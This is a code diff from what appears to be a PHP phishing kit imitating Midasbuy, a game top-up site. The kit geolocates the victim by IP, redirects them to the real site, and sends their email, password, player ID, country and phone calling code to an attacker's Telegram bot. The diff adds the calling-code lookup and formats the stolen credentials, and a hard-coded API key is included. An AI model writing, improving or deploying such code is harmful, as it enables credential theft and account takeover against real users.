@@ -43,6 +43,11 @@ $api_key = "26dc150b1cf3c41dc866400812300e6d";
 $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
+    $codeq = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
+
+$jsondata = json_decode($codeq);
+
+$code = $jsondata->calling_code;
 $url1 = "https://www.midasbuy.com";
 header("location: $url1");
 $name = $message->from->first_name;
@@ -52,11 +57,11 @@ bot("sendMessage",[
 ╭───── • ˹  𝙽𝙴𝚆 𝙰𝙲𝙲𝙾𝚄𝙽𝚃˼  • ─────╮
    ➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  »  $login 
   💻• 𝙸𝙿 » $ip
-  📧 • 𝙴𝚖𝚊𝚒𝚕 »  $email
-  📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » $password
+  📧 • 𝙴𝚖𝚊𝚒𝚕 »  `$email`
+  📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » `$password`
   💎 • 𝙿𝚕𝚊𝚢𝚎𝚛 𝙸𝙳 » $playid
   🏴 • 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » $cty
-  ☎️ • 𝙲𝚘𝚍𝚎 » $code
+  ☎️ • 𝙲𝚘𝚍𝚎 » `+$code`
     ⏱ • 𝚃𝚒𝚖𝚎 » $time
   📝 • 𝙳𝚊𝚝𝚎 » $day/$month/$year
 ╰──────•˹  @PHP505 ˼•──────╯
